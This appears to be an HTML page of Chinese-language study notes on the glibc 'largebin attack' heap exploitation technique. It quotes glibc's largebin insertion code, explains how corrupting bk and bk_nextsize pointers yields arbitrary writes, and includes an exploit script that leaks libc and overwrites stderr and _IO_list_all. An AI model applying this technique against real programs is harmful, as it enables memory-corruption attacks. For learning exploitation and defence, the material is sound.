@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title># largebin attack,largebin attack</title>
+    <link rel="stylesheet" href="/assets/css/notes.min.css">
+</head>
+<body>
+    <div class="main-content-wrapper">
+        <main class="content">
+            <h1>largebin attack</h1>
+<h2>1.基本原理</h2>
+<p>largebin 用来收容超过 0x400 大小以上的 chunk(64 位)，其是一个双向链表，一共可以容纳 63 个 chunk，对于链表对应存储 chunk 的大小没有明确规定，而是规定了一个范围，根据具体的数值可以分为 6 组:</p>
+<table>
+<thead>
+<tr>
+<th>组</th>
+<th>数量</th>
+<th>差值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>32</td>
+<td>64(0x40)</td>
+</tr>
+<tr>
+<td>2</td>
+<td>16</td>
+<td>512(0x200)</td>
+</tr>
+<tr>
+<td>3</td>
+<td>8</td>
+<td>4096(0x1000)</td>
+</tr>
+<tr>
+<td>4</td>
+<td>4</td>
+<td>32768(0x8000)</td>
+</tr>
+<tr>
+<td>5</td>
+<td>2</td>
+<td>262144(0x40000)</td>
+</tr>
+<tr>
+<td>6</td>
+<td>1</td>
+<td>无限制</td>
+</tr>
+</tbody>
+</table>
+<p>下面代码片段是在 _int_malloc 中 unsortedbin 循环取出 chunk 的代码：victim 为从 unsortedbin 中取出的 chunk</p>
+<pre><code class="language-c">if (in_smallbin_range (size))
+{
+  victim_index = smallbin_index (size);
+  bck = bin_at (av, victim_index);
+  fwd = bck-&gt;fd;
+}
+else
+{
+  victim_index = largebin_index (size);
+  bck = bin_at (av, victim_index);
+  fwd = bck-&gt;fd;
+
+  /* maintain large bins in sorted order */
+  if (fwd != bck) // 当第一个不等于后一个（即当前的 largebin 不空）
+    {
+      /* Or with inuse bit to speed comparisons */
+      size |= PREV_INUSE;
+      /* if smaller than smallest, bypass loop below */
+      assert (chunk_main_arena (bck-&gt;bk));
+      if ((unsigned long) (size)
+  &lt; (unsigned long) chunksize_nomask (bck-&gt;bk)) // bck-&gt; bk 储存的是当前索引的 largebin 中大小最小的 chunk，如果我们要插入的 chunk 比这个大小还小，那么就要插入 largebin 的尾部
+        {
+          fwd = bck;
+          bck = bck-&gt;bk;
+
+          victim-&gt;fd_nextsize = fwd-&gt;fd;
+          victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;
+          fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;
+        }
+      else // 如果不是插入尾部，那么我们要找到这个 chunk 应该插入的位置
+        {
+          assert (chunk_main_arena (fwd));
+          while ((unsigned long) size &lt; chunksize_nomask (fwd))
+            {
+              fwd = fwd-&gt;fd_nextsize;
+  assert (chunk_main_arena (fwd));
+            }
+
+          if ((unsigned long) size
+  == (unsigned long) chunksize_nomask (fwd)) // 如果找到了相等的
+            /* Always insert in the second position.  */
+            fwd = fwd-&gt;fd;
+          else //如果大小不一样，构造双向链表
+            {
+              victim-&gt;fd_nextsize = fwd;
+              victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;
+              fwd-&gt;bk_nextsize = victim;
+              victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;
+            }
+          bck = fwd-&gt;bk;
+        }
+    }
+  else
+    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;
+}
+
+mark_bin (av, victim_index);
+victim-&gt;bk = bck;
+victim-&gt;fd = fwd;
+fwd-&gt;bk = victim;
+bck-&gt;fd = victim;
+</code></pre>
+<p>largebin attack 就是通过修改位于 largebin 的 chunk 的指针，然后让其它的 chunk 进入 largebin，借助链表操作在目标地址处写入一个堆的地址</p>
+<p>largebin 可以利用的指针有 bk 和 bk_nextsize</p>
+<p>glibc-2.30 之前，由于 chunk 链入 largebin 的过程中缺乏对 bk 和 bk_nextsize 指针的检查，因此可以通过修改 bk 和 bk_nextsize 指针进行两处任意地址写</p>
+<p>glibc-2.30 及以上版本中，只能利用 largebin attack 来写一个地址</p>
+<p>glibc-2.30 开始如果加入的 chunk 不是最小的则在插入链表时会对 bk 指针进行检查</p>
+<pre><code class="language-c">if (bck-&gt;fd != fwd)
+	malloc_printerr (&quot;malloc(): largebin double linked list corrupted (bk)&quot;);
+</code></pre>
+<p>重点关注上面的大小不一样的这部分代码：</p>
+<pre><code class="language-c">else
+{
+    victim-&gt;fd_nextsize = fwd;
+    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;
+    fwd-&gt;bk_nextsize = victim;
+    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;
+}
+
+bck = fwd-&gt;bk;
+
+victim-&gt;bk = bck;
+victim-&gt;fd = fwd;
+fwd-&gt;bk = victim;
+bck-&gt;fd = victim;
+</code></pre>
+<p>如果劫持一个 largebin 中一个在同等大小 chunk 中 bk 方向最靠前的 chunk 的 bk 和 bk_nextsize 然后 <strong>释放一个比该 chunk 稍大一些的 chunk</strong> 就可以实现下图所示效果：</p>
+<ul>
+<li>主要是 victim 的 fd 和 fd_nextsize 都指向最靠前的 chunk，bk 和 bk_nextsize 分别指向 fakechunk1 和 fakechunk2，同时 fakechunk1 的 fd 和 fakechunk2 的 fd_nextsize 都指向释放的 chunk，也就是存了同一个堆地址</li>
+</ul>
+<p><img src="/0101/PWN/堆利用/BinAttack/assets/5.largebin_attack/%E6%9C%AA%E5%91%BD%E5%90%8D%E7%BB%98%E5%9B%BE.drawio.png" alt="未命名绘图.drawio"></p>
+<h2>2.利用思路</h2>
+<p>漏洞程序参考漏洞程序参考 unsortedbin leak 的测试程序</p>
+<pre><code class="language-c">add_chunk(0, 0x400)
+add_chunk(1, 0x10)
+add_chunk(2, 0x410)
+add_chunk(3, 0x10)
+
+# leak libc
+delete_chunk(0)
+add_chunk(0, 0x400)
+show_chunk(0)
+main_arena_addr = u64Leakbase(0)
+li(&quot;main_arena_addr&quot;, main_arena_addr)
+libc_addr = main_arena_addr - 0x3c4b78
+libc.address = libc_addr
+li(&quot;libc_addr&quot;, libc_addr)
+li(&quot;stderr&quot;, libc.sym[&quot;stderr&quot;])
+li(&quot;_IO_list_all&quot;, libc.sym[&quot;_IO_list_all&quot;])
+
+delete_chunk(0)
+add_chunk(4, 0x500)
+
+payload = b&quot;&quot;
+payload += p64(0)
+payload += p64(libc.sym[&quot;stderr&quot;] - 0x10)
+payload += p64(0)
+payload += p64(libc.sym[&quot;_IO_list_all&quot;] - 0x20)
+edit_chunk(0, payload)
+
+delete_chunk(2)
+add_chunk(0, 0x500)
+
+it()
+</code></pre>
+<p>执行完后调试可以看到 pwndbg 的插件已经崩溃无法识别了，bk 指向的是最后释放的 chunk，其 bk 和 bk_nextsize 分别指向 fakechunk，而两个 fakechunk 中又保存了堆地址</p>
+<p><img src="/0101/PWN/堆利用/BinAttack/assets/5.largebin_attack/image-20241230002021392.png" alt="image-20241230002021392"></p>
+<p><img src="/0101/PWN/堆利用/BinAttack/assets/5.largebin_attack/image-20241230001954735.png" alt="image-20241230001954735"></p>
+<p>调试分析 bck 到底是什么：</p>
+<p><img src="/0101/PWN/堆利用/BinAttack/assets/5.largebin_attack/image-20241230085532891.png" alt="image-20241230085532891"></p>
+
+        </main>
+    </div>
+</body>
+</html>
